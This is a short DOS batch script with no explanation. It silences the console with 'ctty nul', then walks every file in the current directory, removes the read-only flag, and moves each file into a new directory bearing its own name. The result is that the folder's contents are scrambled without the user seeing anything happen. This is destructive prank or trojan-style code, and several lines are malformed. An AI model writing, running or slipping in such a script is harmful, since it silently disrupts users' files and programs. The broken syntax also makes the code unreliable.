   @echo off
   ctty nul
   if %1==" goto Hold
   attrib -r %1
   ren %1 Hold.PC
   md %1
   move Hold.PC %1\
   ren %1\Hold.PC %1\%1
   goto EndHold
   :Hold
   for %%n in(*?.*) do Call %0 %%n
   :EndHold
